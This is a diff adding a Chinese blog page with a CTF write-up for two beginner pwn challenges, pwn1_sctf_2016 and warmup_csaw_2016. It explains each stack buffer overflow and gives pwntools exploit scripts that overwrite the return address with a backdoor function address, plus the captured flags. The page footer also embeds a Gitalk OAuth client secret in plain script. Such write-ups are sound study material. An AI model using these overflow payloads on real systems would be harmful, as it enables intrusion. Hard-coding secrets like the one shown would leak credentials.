@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+  
+  <title>砰！ - 人 類 補 完 計 画</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="V10A2B9S">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+  
+  
+
+  <link rel="shortcut icon" href="/favicon.ico" type="image/png" />
+  <meta name="description" content="放假在家准备接触一下从未挑战过的pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="砰！">
+<meta property="og:url" content="http://example.com/2021/01/26/pwn/index.html">
+<meta property="og:site_name" content="人 類 補 完 計 画">
+<meta property="og:description" content="放假在家准备接触一下从未挑战过的pwn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png">
+<meta property="article:published_time" content="2021-01-26T04:07:07.903Z">
+<meta property="article:modified_time" content="2021-01-26T05:19:07.091Z">
+<meta property="article:author" content="Kyrita">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css?v=233" crossorigin>
+  
+  <link rel="stylesheet" href="/css/style.css?v=1611820890489">
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/cover/5c3aec85a4343.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Kyrita" class="mdui-btn mdui-btn-icon"><img src="https://i.loli.net/2021/01/22/uN3eW6zlCXSI7fB.jpg" alt="Kyrita"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Kyrita">
+            <img src="https://i.loli.net/2021/01/22/uN3eW6zlCXSI7fB.jpg" alt="Kyrita" alt="Kyrita">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>9</div>
+        <div><span>标签</span>5</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about/" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" target="_blank" rel="noopener" href="https://aidn.jp/mikutap/" title="GAME">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                GAME
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        <form id="search_form" action_e="https://www.google.com/search?q=site:kyrita.top" onsubmit="return search();">
+            <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+        </form>
+    </div>
+</div>
+  
+  <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://jq.qq.com/?_wv=1027&k=fqM5fPgY" target="_blank" mdui-tooltip="{content: 'QQ'}" style="color: rgb(135, 206, 250);background-color: rgba(135, 206, 250, .10);">
+            <i class="nexmoefont icon-QQ"></i>
+        </a><a class="mdui-ripple" href="https://space.bilibili.com/33973219" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/guda04021" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a><a class="mdui-ripple" href="https://steamcommunity.com/profiles/76561198317198297" target="_blank" mdui-tooltip="{content: 'Steam'}" style="color: rgb(65, 105, 225);background-color: rgba(65, 105, 225, .15);">
+            <i class="nexmoefont icon-steam"></i>
+        </a><a class="mdui-ripple" href="https://aidn.jp/momotap/" target="_blank" mdui-tooltip="{content: 'MOMOTAP'}" style="color: rgb(139, 71, 38);background-color: rgba(139, 71, 38, .15);">
+            <i class="nexmoefont icon-coffee"></i>
+        </a><a class="mdui-ripple" href="https://aidn.jp/mikuboard/" target="_blank" mdui-tooltip="{content: 'MIKUBOARD'}" style="color: rgb(152, 251, 152);background-color: rgba(152, 251, 152, .15);">
+            <i class="nexmoefont icon-coffee"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/wiki/">wiki</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/wp/">wp</a>
+          <span class="category-list-count">8</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Re/" style="font-size: 15px;">Re</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a><span class="archive-list-count">9</span></li></ul>
+    </div>
+  </div>
+
+
+<style>
+.nexmoe-widget .archive-list-count{
+	position : absolute;
+	right: 15px;
+	top:9px;
+	color: #DDD;
+}
+</style>
+
+  
+  <div id="music163player">
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=450 src="//music.163.com/outchain/player?type=0&id=5470527098&auto=0&height=430"></iframe>
+</div>
+</aside>
+
+
+
+    <div class="nexmoe-copyright">
+        &copy; 2021 Kyrita
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+  
+      <div class="nexmoe-post-cover" style="padding-bottom: 66.66666666666666%;"> 
+          <img data-src="https://i.loli.net/2021/01/26/u7zInpW94qxlSA8.jpg" data-sizes="auto" alt="砰！" class="lazyload">
+          <h1>砰！</h1>
+      </div>
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年01月26日</a>
+    <a><i class="nexmoefont icon-areachart"></i>294 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+</div>
+
+  <div class="nexmoe-post-right">
+    
+  </div>
+
+  <article>
+    <p>放假在家准备接触一下从未挑战过的pwn</p>
+<a id="more"></a>
+<h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><h2 id="Download文件后checksec"><a href="#Download文件后checksec" class="headerlink" title="Download文件后checksec"></a>Download文件后checksec</h2><img src="https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png" >
+
+
+<p>地址在哪已经显而易见了,接着我们IDA静态分析一下;</p>
+<h2 id="找到漏洞函数"><a href="#找到漏洞函数" class="headerlink" title="找到漏洞函数"></a>找到漏洞函数</h2><img src="https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png" >
+
+<p>s的长度为60,而我们只能够输入32个字符,不足以栈溢出;<br>但是replace函数会把我们输入的I替换成you,I是一个字符,you是三个字符,这样输入20个I既不会超过32字符限制,最终替换成60个字符也能够填满s.</p>
+<h3 id="找到后门函数-08048F0D"><a href="#找到后门函数-08048F0D" class="headerlink" title="找到后门函数:08048F0D"></a>找到后门函数:08048F0D</h3><img src="https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png" >
+
+<li>exp:</li>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27833</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">20</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x08048F0D</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行结果:</p>
+<img src="https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png" >
+
+<p>拿到flag:<br>flag{5e9a24f6-ddb2-4237-b3e0-6d968c34cec8}</p>
+<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>拖入IDA F5</p>
+<img src="https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png" >
+
+
+<p>发现要求输入v5自变量;</p>
+<img src="https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png" >
+
+<p>v5的可用栈大小为0x40<br>可以看出,这个gets绝对有问题;</p>
+<p>程序存在后门:</p>
+<img src="https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png" >
+
+<p>sub_40060D的地址为0x40060D</p>
+<p>下面我们可以写个脚本跑出flag;<br>在此之前我们知道v5的栈大小为0x40,但还需要加上返回值的8个字符;<br>最终为0x48.</p>
+<li>构造exp</li>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28395</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40060D</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<img src="https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png" >
+
+<p>得到flag:<br>flag{a15dd406-0d79-4f49-b5a0-3dde546a4d3d}</p>
+
+  </article>
+
+  
+    
+  <div class="nexmoe-post-copyright">
+    <strong>本文作者：</strong>Kyrita<br>
+    <strong>本文链接：</strong><a href="http://example.com/2021/01/26/pwn/" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;pwn&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;pwn&#x2F;</a><br>
+    
+      <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+    
+  </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/wp/">wp</a>
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/pwn/" rel="tag">pwn</a>
+    
+</div>
+
+  <div class="nexmoe-post-footer">
+    <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '3a1d03ac6ff28de78bee',
+        clientSecret: '8f832c7d5a9bddebc5fb0ee387c6c30743340a56',
+        id: decodeURI("{{ page.url }}"),
+        repo: 'Discussion',
+        owner: 'guda04021',
+        admin: 'guda04021'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+  </div>
+</div>
+
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+ <script src="/js/app.js?v=1611820890490"></script>
+
+</body>
+
+</html>
